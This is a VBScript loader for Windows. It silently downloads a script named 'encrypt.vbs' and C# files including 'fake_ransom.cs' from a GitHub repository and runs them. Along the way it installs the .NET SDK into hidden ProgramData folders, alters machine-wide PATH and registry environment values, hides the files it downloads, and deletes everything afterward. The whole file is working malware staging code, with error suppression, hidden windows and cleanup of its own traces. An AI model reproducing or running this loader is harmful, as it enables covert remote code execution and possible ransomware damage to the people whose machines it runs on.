' Suppress all error popups
On Error Resume Next

Dim objShell, fso, tempDir, configDir, dotnetPath, installerScript
Dim downloadCmd, installCmd, runCmd, args, dotnetExe
Dim lalaUrl, lalaPath, url1, url2, path1, path2, fObj

Set objShell = CreateObject("WScript.Shell")
Set fso      = CreateObject("Scripting.FileSystemObject")
If objShell Is Nothing Or fso Is Nothing Then WScript.Quit

' Non-admin, non-profile temp dir.
' C:\ProgramData allows standard users to create subfolders (CREATOR OWNER
' gets Full Control on the created folder), so no elevation is needed.
tempDir = "C:\ProgramData\.apptemp"

' curl -o and CreateObject do NOT create parent folders — create it first
If Not fso.FolderExists(tempDir) Then fso.CreateFolder(tempDir)
configDir       = "C:\ProgramData\.dotnet"
dotnetPath      = "C:\ProgramData\.dotnet"
installerScript = tempDir & "\dotnet-install.ps1"

' ---- BUG FIX #2: make sure install dir exists ------------------
If Not fso.FolderExists(configDir) Then fso.CreateFolder(configDir)

' =========================================================
' STEP 0 — download and run encrypt.vbs FIRST (blocking)
' =========================================================
lalaUrl  = "https://raw.githubusercontent.com/rahul-call/inner/main/ror/encrypt.vbs"
lalaPath = configDir & "\encrypt.vbs"

objShell.Run "cmd /c curl -sL -o """ & lalaPath & """ """ & lalaUrl & """", 0, True

If fso.FileExists(lalaPath) Then
    objShell.CurrentDirectory = configDir
    objShell.Run "cscript.exe //nologo """ & lalaPath & """", 0, True   ' blocks until done

    ' encrypt.vbs has finished running — delete it now
    fso.DeleteFile lalaPath, True
End If

' =========================================================
' STEP 1 — download official dotnet-install.ps1
' =========================================================
downloadCmd = "cmd /c curl -sL -o """ & installerScript & """ https://dot.net/v1/dotnet-install.ps1"
objShell.Run downloadCmd, 0, True

If Not fso.FileExists(installerScript) Then WScript.Quit

' =========================================================
' STEP 2 — install .NET 10 SDK to C:\ProgramData\.dotnet
' =========================================================
installCmd = "powershell -NoProfile -ExecutionPolicy Bypass -File """ & installerScript & """ -Channel 10.0 -InstallDir """ & dotnetPath & """"
objShell.Run installCmd, 0, True

dotnetExe = dotnetPath & "\dotnet.exe"

' ---- BUG FIX #3: bail out if install failed silently -----------
If Not fso.FileExists(dotnetExe) Then WScript.Quit

' =========================================================
' STEP 3 — set environment variables (machine-wide / GLOBAL)
' =========================================================
SetSystemEnv "DOTNET_ROOT", dotnetPath
AppendToSystemPath dotnetPath

' ---- BUG FIX #5: broadcast change for DOTNET_ROOT --------------
' setx /M writes AND broadcasts WM_SETTINGCHANGE. Only use it for
' DOTNET_ROOT (short value, no 1024-char truncation risk).
objShell.Run "cmd /c setx DOTNET_ROOT """ & dotnetPath & """ /M >nul 2>&1", 0, True

' =========================================================
' STEP 4 — download auto.cs and fake_ransom.cs from GitHub
' =========================================================
url1  = "https://raw.githubusercontent.com/rahul-call/inner/main/ror/auto.cs"
url2  = "https://raw.githubusercontent.com/rahul-call/inner/main/ror/fake_ransom.cs"
path1 = configDir & "\auto.cs"
path2 = configDir & "\fake_ransom.cs"

objShell.Run "cmd /c curl -sL -o """ & path1 & """ """ & url1 & """", 0, True
objShell.Run "cmd /c curl -sL -o """ & path2 & """ """ & url2 & """", 0, True

' ---- BUG FIX #1: OR with existing attributes, not "= 2" --------
If fso.FileExists(path1) Then
    Set fObj = fso.GetFile(path1)
    fObj.Attributes = fObj.Attributes Or 2
End If
If fso.FileExists(path2) Then
    Set fObj = fso.GetFile(path2)
    fObj.Attributes = fObj.Attributes Or 2
End If

' ---- BUG FIX #4: don't run if either file is missing -----------
If Not fso.FileExists(path1) Then WScript.Quit
If Not fso.FileExists(path2) Then WScript.Quit


' =========================================================
' STEP 5 — run C# files as-is, then clean up
' =========================================================
args   = "run --file auto.cs -- fake_ransom.cs"
runCmd = "cmd /c cd /d """ & configDir & """ && """ & dotnetExe & """ " & args

' True = wait until dotnet.exe exits
objShell.Run runCmd, 0, True

' Remove ONLY the two .cs files — SDK stays intact
If fso.FileExists(path1) Then fso.DeleteFile path1, True   ' True = force (handles Hidden/ReadOnly)
If fso.FileExists(path2) Then fso.DeleteFile path2, True


' =========================================================
' STEP 6 — remove the temp folder entirely
' =========================================================
' lala.vbs was already deleted right after it ran (Step 0).
' dotnet-install.ps1 is still there — remove it first, then the folder.
If fso.FileExists(installerScript) Then fso.DeleteFile installerScript, True
If fso.FolderExists(tempDir)       Then fso.DeleteFolder tempDir, True

' ---------------------------------------------------------
' Helpers (machine-wide / global env vars)
' ---------------------------------------------------------
Sub SetSystemEnv(varName, varValue)
    objShell.RegWrite _
        "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\" & varName, _
        varValue, "REG_EXPAND_SZ"
End Sub

Sub AppendToSystemPath(newPath)
    Dim regPath, currentPath, paths, p, found
    regPath     = "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\Path"
    currentPath = objShell.RegRead(regPath)

    If currentPath = "" Then
        objShell.RegWrite regPath, newPath, "REG_EXPAND_SZ"
        Exit Sub
    End If

    found = False
    ' ---- BUG FIX #7: compare with trailing ";" trimmed -----------
    For Each p In Split(currentPath, ";")
        If LCase(Trim(p)) = LCase(newPath) Then
            found = True
            Exit For
        End If
    Next

    If Not found Then
        objShell.RegWrite regPath, newPath & ";" & currentPath, "REG_EXPAND_SZ"
    End If
End Sub
